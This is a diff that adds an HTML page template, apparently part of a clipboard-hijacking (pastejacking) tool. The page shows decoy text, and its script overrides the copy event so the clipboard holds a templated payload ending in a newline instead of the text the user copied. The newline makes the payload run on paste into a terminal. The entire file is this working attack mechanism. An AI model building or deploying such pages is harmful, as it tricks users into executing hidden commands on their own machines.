@@ -1,0 +1,13 @@
+<html>
+    <body>
+        {{fake_p1 | safe}} {{fake_p2 | safe}}
+        <script>
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                e.clipboardData.setData('text/plain', '{{payload}}\r\n');
+                e.preventDefault();
+            });
+        </script>
+    </body>
+
+</html>
